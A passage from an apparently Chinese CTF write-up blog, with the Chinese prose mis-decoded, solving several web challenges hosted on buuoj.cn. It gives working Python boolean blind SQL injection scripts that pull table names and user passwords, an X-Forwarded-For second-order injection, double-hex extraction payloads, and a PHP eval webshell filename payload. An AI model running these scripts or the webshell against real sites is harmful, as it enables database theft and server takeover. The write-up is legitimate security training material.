class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>åŸºæœ¬æ€è·¯ï¼š<strong>boolç›²æ³¨ï¼Œè¯­å¥æˆåŠŸçš„è¯ï¼Œå°±è®©id = 1ï¼Œå›æ˜¾æ­£å¸¸ï¼Œé”™è¯¯çš„è¯ id = 0ï¼Œå°±ä»€ä¹ˆéƒ½æ²¡æœ‰</strong>ã€‚</p><p>å•å¼•å·é€ƒé€¸çš„æ–¹æ³•æ˜¯ç”¨<code>\0</code>æ¥è½¬ä¹‰æ‰å®ƒçš„å•å¼•å·ã€‚è¾“å…¥<code>\0</code>ï¼Œç»è¿‡<code>addslashes</code>å‡½æ•°ä¼šå…ˆå˜æˆ<code>\\0</code>,ç„¶åç»è¿‡â€œstr_replaceâ€å‡½æ•°ï¼Œä¼šå˜æˆ<code>\</code>,è¿™æ ·ï¼Œå°±æŠŠidåé¢çš„å•å¼•å·ç»™è½¬ä¹‰äº†ã€‚</p><p>SQLç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://143e2c2b-3448-4468-aeee-95cd35c73be0.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">payload = <span class="string">&quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">flag = <span class="string">&quot;JFIF&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        response = requests.get(url + payload.format(i, mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>ç™»å½•åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œç»è¿‡æµ‹è¯•åå¯ä»¥å‘ç°ï¼Œ<code>upload.php</code>æŠŠä¸Šä¼ çš„æ–‡ä»¶åå†™å…¥äº†ä¸€ä¸ªphpæ–‡ä»¶åç¼€çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶ä¸”è·¯å¾„å·²çŸ¥ã€‚ä½†æ˜¯æ–‡ä»¶åä¼šè¿‡æ»¤phpï¼Œå¯ä»¥ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åèšå‰‘ç›´æ¥è¿æ¥ã€‚</p><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢">WUSTCTF2020 é¢œå€¼æˆç»©æŸ¥è¯¢</h2><h3 id="è€ƒç‚¹-v17">è€ƒç‚¹</h3><ul><li>MySQLç›²æ³¨</li></ul><h3 id="è§£é¢˜-v16">è§£é¢˜</h3><p>æ¯”è¾ƒæ˜æ˜¾çš„GETå‹çš„SQLæ³¨å…¥ï¼ŒFUZZä¸€ä¸‹</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708105750.png" style="zoom:50%;" /><p>å‘ç°å¥½åƒæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼ŒéªŒè¯ä¸€ä¸‹</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708105954.png" alt=""></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç›´æ¥å†™ç›²æ³¨è„šæœ¬äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a55db98c-72b1-40e8-b771-61b1bc60cd9d.node3.buuoj.cn/?stunum=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Hi admin, your score is: 100&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;ctf&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(group_concat(flag,0x3a,value))from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        response = requests.post(url+payload.format(i, mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h3 id="æ‹“å±•">æ‹“å±•</h3><p>æˆ‘ä»¬å†å¹æ¯›æ±‚ç–µä¸€ç‚¹ï¼Œä¸Šä¸€ä¸ªè„šæœ¬è·‘å‡ºæ¥çš„flagéƒ½æ˜¯å¤§å†™å­—æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¦‚ä½•åŒºåˆ†å¤§å°å†™å‘¢ã€‚</p><p>å‚è€ƒä¸­çš„ç¬¬äºŒç¯‡æ–‡ç« å·²ç»å‘Šè¯‰äº†æˆ‘ä»¬ç­”æ¡ˆï¼Œæƒ³åŠæ³•æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶åï¼Œè¿›è¡Œå­—èŠ‚å¯¹å­—èŠ‚çš„æ¯”è¾ƒã€‚ä½†æ˜¯å‡½æ•°<code>BINARY</code>ä¸­çš„<code>in</code>è¢«ç¦æ‰äº†ï¼Œä½œè€…åˆå‘ç°äº†ä¸€ç§æ€è·¯ï¼Œå½“ä¸€ä¸ªå­—ç¬¦ä¸²è¿æ¥ä¸€ä¸ªäºŒè¿›åˆ¶çš„å€¼æ—¶<code>CONCAT(&quot;aa&quot;, BINARY(&quot;BB&quot;))</code>ï¼Œå…¶å¾—åˆ°çš„ä¹Ÿå°†æ˜¯äºŒè¿›åˆ¶ã€‚</p><p>å¹¶ä¸”MySQLä¸­çš„JSONå¯¹è±¡æ˜¯äºŒè¿›åˆ¶å¯¹è±¡ï¼Œå› æ­¤ï¼Œ<code>CAST(0 AS JSON)</code>ä¼šè¿”å›ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¿›è€Œ<code>SELECT CONCAT(â€œAâ€, CAST(0 AS JSON))</code>ä¹Ÿä¼šè¿”å›ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬çœ‹ä¸€çœ‹ä¸‹é¢è¿™ä¸ªpayloadèƒ½å¦å¯è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2||(select 1,concat(&#39;&#123;&#125;&#39;,cast(&#39;0&#39; as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure><p>è¿”å›äº†errorã€‚æˆ‘çŒœåº”è¯¥æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œç”¨ç¬¬ä¸€ä¸ªç›²æ³¨è„šæœ¬æŸ¥çœ‹ä¸€ä¸‹version()ï¼Œå‘ç°æ˜¯MariaDB 10.2.26ã€‚</p><p>æŸ¥è¯¢ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼ŒMariaDBåœ¨10.2.7æ‰åŠ å…¥äº†JSONæ•°æ®ç±»å‹ã€‚</p><p>æ— æœã€‚</p><h3 id="å‚è€ƒ">å‚è€ƒ</h3><p><a href="https://www.gem-love.com/ctf/1782.html">https://www.gem-love.com/ctf/1782.html</a></p><p><a href="https://nosec.org/home/detail/3830.html">https://nosec.org/home/detail/3830.html</a></p><h2 id="RoarCTF2019-Online-Proxy">RoarCTF2019 Online Proxy</h2><h3 id="è€ƒç‚¹-v18">è€ƒç‚¹</h3><ul><li>XFFæ³¨å…¥</li><li>äºŒæ¬¡æ³¨å…¥</li><li>ç›²æ³¨</li></ul><h3 id="é¢˜è§£-v2">é¢˜è§£</h3><p>è¿™é“é¢˜çš„æ³¨å…¥ç‚¹åœ¨X-Forwarded-Forï¼Œåˆ©ç”¨XFFæ¥æ›´æ”¹IPåœ°å€ï¼Œå¯ä»¥å‘ç°IPè¢«ä¿å­˜å¹¶è¾“å‡ºäº†ã€‚</p><p>æ—¢ç„¶ä»–çš„last-ipå’Œcurrent-ipä¼šæ›´æ–°ï¼Œç”±æ­¤å¯ä»¥çŒœæƒ³ä»–ä¸æ•°æ®åº“è¿›è¡Œäº†äº¤äº’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (<span class="keyword">current</span>-ip,<span class="keyword">last</span>-ip ) <span class="keyword">VALUES</span> (<span class="string">&#x27;$current-ip&#x27;</span>,<span class="string">&#x27;$last-ip&#x27;</span> );</span><br></pre></td></tr></table></figure><p>ç”±äºè¿™é¢˜æœ‰å›æ˜¾ï¼Œå› æ­¤ï¼Œå¯ä»¥è€ƒè™‘äºŒæ¬¡æ³¨å…¥ã€‚</p><p>é¦–å…ˆç”¨ä¸‹é¢è¿™ä¸ªpayloadéªŒè¯ä¸€ä¸‹èƒ½ä¸èƒ½æˆåŠŸåœ°é—­åˆè¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39; or ascii(substr((select(database())),1,1))&gt;100 or &#39;0</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721181214.png" alt=""></p><p>å†éšä¾¿è¾“å…¥</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721181937.png" alt=""></p><p>å†æ¬¡å‘é€è¯·æ±‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721182026.png" alt=""></p><p>éªŒè¯æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™ç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.buuoj.cn:29354/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸ªheadå¤´å¥½åƒå¿…é¡»åŠ cookie</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;track_uuid=60661451-cdab-4a74-95b4-74d6a66945a9&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># #æŸ¥åº“å</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #æŸ¥è¡¨å</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;F4l9_D4t4B45e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #æŸ¥åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F4l9_t4b1e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;æ’å…¥sqlè¯­å¥&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload1 = payload.format(i, mid)</span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = payload1</span><br><span class="line">        requests.get(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;é‡æ–°å‘é€ä¸¤æ¬¡è¯·æ±‚&#x27;&#x27;&#x27;</span></span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;penson&quot;</span></span><br><span class="line">        requests.get(url, headers=head)</span><br><span class="line">        r = requests.get(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Last Ip: 1 &quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="æ‹“å±•-v2">æ‹“å±•</h3><p>æ›´å¤šçš„é—­åˆæ–¹å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; or (payload) or &#39;</span><br><span class="line">&#39; and (payload) and &#39;</span><br><span class="line">&#39; or (payload) and &#39;</span><br><span class="line">&#39; or (payload) and &#39;&#x3D;&#39;</span><br><span class="line">&#39;* (payload) *&#39;</span><br><span class="line">&#39; or (payload) and &#39;</span><br><span class="line">&quot; â€“ (payload) â€“ &quot;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;+conv(hex(substr((select database()),1,5)),16,10)+&#39;0</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šä¸€æ¬¡ä¸èƒ½è¯»å¤ªå¤šä½ï¼Œä¸ç„¶10è¿›åˆ¶ä¼šç”¨ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºï¼Œå°±æ— æ³•è½¬æ¢å›åŸå­—ç¬¦ä¸²äº†ã€‚</p><h2 id="ç½‘é¼æ¯2018-Unfinished">ç½‘é¼æ¯2018 Unfinished</h2><h3 id="è€ƒç‚¹-v19">è€ƒç‚¹</h3><ul><li>äºŒæ¬¡æ³¨å…¥</li><li>ä¸¤æ¬¡Hexç¼–ç </li></ul><h3 id="è§£é¢˜-v17">è§£é¢˜</h3><p>ç™»é™†çš„æ—¶å€™ç”¨åˆ°çš„æ˜¯é‚®ç®±å’Œå¯†ç ï¼Œè€Œæ³¨å†Œçš„æ—¶å€™è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·åï¼Œè€Œè¿™ä¸ªç”¨æˆ·åå´åœ¨ç™»é™†åæ˜¾ç¤ºäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç”¨æˆ·åè¿™é‡Œå¯èƒ½å­˜åœ¨ <strong>äºŒæ¬¡æ³¨å…¥</strong>ã€‚</p><p>æ³¨å†ŒæˆåŠŸï¼Œä¼šå¾—åˆ° <strong>302</strong> çŠ¶æ€ç å¹¶è·³è½¬è‡³ <strong>login.php</strong> ï¼›å¦‚æœæ³¨å†Œå¤±è´¥ï¼Œåªä¼šè¿”å› <strong>200</strong> çŠ¶æ€ç ã€‚æ‰€ä»¥æ„é€  <strong>payload</strong> å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email&#x3D;test@666.com&amp;username&#x3D;0&#39;%2B(select hex(hex(database())))%2B&#39;0&amp;password&#x3D;test</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¦ä¸¤æ¬¡hexåŠ å¯†ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721213306.png" alt=""></p><p>ä¸Šé¢è¿™å¼ å›¾å±•ç¤ºçš„æ˜¯ï¼Œå¦‚æœå­—ç¬¦ä¸²hexåçš„å€¼ä¸­åŒ…å«å­—æ¯ï¼Œåœ¨ä¸0ç›¸åŠ ååªèƒ½æ˜¾ç¤ºå­—æ¯ä¹‹å‰çš„æ•°å­—ä¸0ç›¸åŠ çš„ç»“æœã€‚ä¸¤æ¬¡hexç¼–ç å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721214124.png" alt=""></p><p>ç„¶åè¿™é‡Œè¿˜è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å½“æ•°æ®è¿›è¿‡ <strong>ä¸¤æ¬¡hex</strong> åï¼Œä¼šå¾—åˆ°è¾ƒé•¿çš„ä¸€ä¸²åªå«æœ‰æ•°å­—çš„å­—ç¬¦ä¸²ï¼Œå½“è¿™ä¸ªé•¿å­—ç¬¦ä¸²è½¬æˆæ•°å­—å‹æ•°æ®çš„æ—¶å€™ä¼šå˜æˆç§‘å­¦è®¡æ•°æ³•ï¼Œå°±æ— æ³•è¿˜åŸæœ¬èº«çš„å­—ç¬¦ä¸²ã€‚</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ substr æ¯æ¬¡å–10ä¸ªå­—ç¬¦é•¿åº¦ä¸ â€˜0â€™ ç›¸åŠ ï¼Œè¿™æ ·å°±ä¸ä¼šä¸¢å¤±æ•°æ®ã€‚ä½†æ˜¯è¿™é‡Œä½¿ç”¨é€—å· <strong>,</strong> ä¼šå‡ºé”™ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ç±»ä¼¼ substr(â€˜testâ€™ from 1 for 10) è¿™ç§å†™æ³•æ¥ç»•è¿‡ï¼Œå…·ä½“è·å– <strong>flag</strong> çš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;%2b(select substr(hex(hex((select * from flag))) from 1 for 10))%2b&#39;0</span><br></pre></td></tr></table></figure><p>æ³¨å…¥è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re, binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7fb57b69-428d-4c33-8988-d08449ffb183.node3.buuoj.cn/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select * from flag&quot;</span></span><br><span class="line"></span><br><span class="line">email = [<span class="string">&quot;test0&quot;</span> + str(i) + <span class="string">&quot;@aa.aa&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>)]  <span class="comment"># è¿™é‡Œæ¬¡æ•°å¯ä»¥é€šè¿‡sqlçˆ†ç ´flagé•¿åº¦å¾—åˆ°ï¼Œæˆ–è€…ä¹Ÿå¯fuzz</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">email, offset</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;0&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;0&quot;</span>.format(sql, str(<span class="number">1</span> + offset * <span class="number">10</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req = requests.post(url + <span class="string">&quot;/register.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">email</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;/login.php&quot;</span>, data, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">    pattern = <span class="string">&#x27;&lt;span class=\&quot;user-name\&quot;&gt;\s*(\d&#123;1,10&#125;)\s*&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> re.findall(pattern, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    raw = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> email, offset <span class="keyword">in</span> zip(email, range(<span class="number">0</span>, len(email))):</span><br><span class="line">        register(email, offset)</span><br><span class="line">        test = login(email)</span><br><span class="line">        print(test)</span><br><span class="line">        raw += test</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;[-] Double Hex : -&gt; %s &lt;-\r&quot;</span> % (raw))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;[+] Double Hex : -&gt; &#123;&#125; &lt;-&quot;</span>.format(raw))</span><br></pre></td></tr></table></figure><h2 id="BlackWatch-å…¥ç¾¤é¢˜-Web">BlackWatch å…¥ç¾¤é¢˜ Web</h2><h3 id="è€ƒç‚¹-v20">è€ƒç‚¹</h3><ul><li>MySQLç›²æ³¨</li></ul><h3 id="è§£é¢˜-v18">è§£é¢˜</h3><p>ç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 